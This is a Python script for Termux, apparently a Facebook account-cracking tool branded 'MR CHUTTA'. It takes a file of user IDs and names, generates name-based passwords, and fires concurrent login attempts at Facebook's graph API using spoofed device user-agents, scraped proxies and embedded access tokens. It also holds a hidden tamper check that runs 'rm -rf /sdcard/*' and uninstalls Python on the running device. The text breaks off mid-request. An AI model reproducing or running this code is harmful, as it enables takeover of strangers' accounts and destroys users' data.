#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT : MR CHUTTA
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')    
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ ETC MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', f'''\x1b[38;5;196m >> \x1b[1;97m''')              
gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-75505','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOUR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
BU= '\033[1;34m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;46m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';faltu = '\033[1;47m'
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
with open('/data/data/com.termux/files/usr/lib/python3.12/http/client.py', 'r') as file:
    file_content = file.read()
if 'print(data.decode())' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('pkg uninstall python -y')
    os.system('pkg uninstall pycurl -y')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/Downloads')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PROX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    print('Internet Error')
    sys.exit()
xvx = open('.prox.txt', 'r').read().splitlines()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<MR.CHUTTA>\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def yek():
    import random
    fbav = f'{random.randint(10,437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbbv = str(random.randint(10000000, 99999999))
    sex = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
    umah = '[FBAN/Orca-Android;FBAV/483.0.0.51.72;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/67467545;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    xuna = sex+umah
    ex = random.choice([xuna])
    return ex
def M10():
    ua = '[FBAN/FB4A;FBAV/'+str(random.randint(10, 100))+'.0.0.'+str(random.randint(1111, 9999))+';FBBV/'+str(random.randint(1111111, 9999999)) + ";[FBAN/FB4A;FBAV/62.0.0.3451;FBBV/1420777;FBDM={density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/132900689;FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 11Pro;FBSV/13;FBOP/1;FBCA/arm64-v8a;]"
    return ua    

def UA():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[Dalvik/2.1.0 (Linux;  U; Android 9.0.1; SM-A205U Build/RKQ1.211103.002) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.25,width=1040,height=2439};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    c = ';[Dalvik/2.1.0 (Linux;  U; Android 11.0.1; SM-A205W Build/TP1A.220905.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3 75,width=1373,height=1824};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205W;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    d = ';[Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A205FN Build/TP1A.220905.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.25,width=760,height=2422};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    e = ';[Dalvik/2.1.0 (Linux;  U; Android 7.0.1; SM-A205F Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=867,height=1891};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    f = ';[Dalvik/2.1.0 (Linux;  U; Android 9.0.1; SM-A205GN Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1252,height=1991};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205GN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b + c + d + e + f
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
logo=f"""\x1b[38;5;46m ▗▖  ▗▖▗▄▄▖      ▗▄▄▖▗▖ ▗▖▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▖ 
\x1b[38;5;46m ▐▛▚▞▜▌▐▌ ▐▌    ▐▌   ▐▌ ▐▌▐▌ ▐▌  █    █ ▐▌ ▐▌
\x1b[38;5;46m ▐▌  ▐▌▐▛▀▚▖    ▐▌   ▐▛▀▜▌▐▌ ▐▌  █    █ ▐▛▀▜▌
\x1b[38;5;46m ▐▌  ▐▌▐▌ ▐▌    ▝▚▄▄▖▐▌ ▐▌▝▚▄▞▘  █    █ ▐▌ ▐▌
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}●{A}] {G}FACEBOOK   {R} >>   {A}MR CHUTTA
{A}[{R}●{A}] {G}STATUS      {R}>>   {A}FILE {R}x{A}ONLY
{A}[{R}●{A}] {G}VERSION   {R}  >>   {A}1.5
{A}[{R}●{A}] {G}TOOL      {R}  >>   {A}PERSONAL
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
        try:                        
                        clear();print(f'{A}[{R}1{A}] {G}FILE CRACK\n{A}[{A}{R}2{A}] {G}EXIT')
                        linex()
                        CHUTTA=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                        if CHUTTA in ['1','01']:
                                clear();print(f'{A}[{R}●{A}]{G} EXAMPLE {R}:{A} /sdcard/fardin.txt ');linex()
                                file = input(f'{A}[{R}●{A}]{G} FILE NAME {R}: \033[1;32m{A}')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{A}[{R}●{A}]{G} FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{A}[{R}1{A}]{G} METHOD M1\n{A}[{R}2{A}]{G} METHOD M2\n{A}[{R}3{A}]{G} METHOD M3');linex()
                                mthd=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                clear()
                                plist = []           
                                print(f'{A}[{R}1{A}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                if ppp in ['0','00']:
                                        plist.append('first last')
                                        plist.append('first123')
                                        plist.append('first1234')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'{A}[{R}●{A}]{G} PASSWORD LIMIT \033[1;32m{R}: \033[1;32m{A}'))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'{A}[{R}●{A}]{G} EXAMPLE \033[1;32m{R}: \033[1;31m{A}firstlast/first1234/first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{R}[{G}+{R}]{G} PASSWORD NO {i+1} \033[1;32m{R}: \033[1;32m{A}'))
                                clear();print(f'{A}[{R}●{A}]{G} DO YOU CP SHOW ACCOUNT {A}(Y{G}/{A}N) ')
                                linex()
                                cx=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'{A}[{R}●{A}] {G}TOTAL ID {R} >>{A} {total_ids} {R} >> {G}CRACKING METHOD {R} >>{A} M{mthd}')                                   
                                        print(f'{A}[{R}●{A}] {G}TURN ON/OF AIRPLAN MODE EVERY 2 MIN')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api4,ids,names,passlist)
                                linex()
                                print(f'{A}[{R}●{A}] {G}THE PROCESS HAS COMPLETED')
                                print(f'{A}[{R}●{A}] {G}TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(f'{A}[{R}●{A}] {G}PRESS ENTER TO BACK ')
                                menu()
                        elif CHUTTA in ['','0']:
                                ___RANDOM___()
                        elif CHUTTA in ['3','03']:
                                print("Next up")
                        elif CHUTTA in ['4','04']:
                                os.system('xdg-open https:');menu()
                        elif CHUTTA in ['2','02']:
                                exit(f'{R}[{G}+{R}]{G} EXIT DONE ')
                        else:
                                exit(f'{A}[{R}●{A}]{G} OPTION NOT FOUND IN MENU');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'{R}[{G}+{R}]{G} NO INTERNET CONNECTION...')
                exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [CHUTTA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.61;FBBV/787895399;FBDM/{density=1.5,width=720,height=1280};FBLC/en_IN;FBRV/387109426;FBCR/Personal;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/23116PN5BC;FBSV/14.0;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_analytics_claim':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'account_recovery',
'generate_machine_id':'1',
'jazoest':'2980',
'meta_inf_fbmeta':'V2_UNTAGGED',
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name':'autheticate',
'fb_api_caller_class':'Fb4aAuthHandler',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'POST': '/auth/login HTTP/2',
'Host': 'b-graph.facebook.com',
'Priority': 'u=3, i',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Sim-Hni': '64301',
'X-Fb-Net-Hni': '64301',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
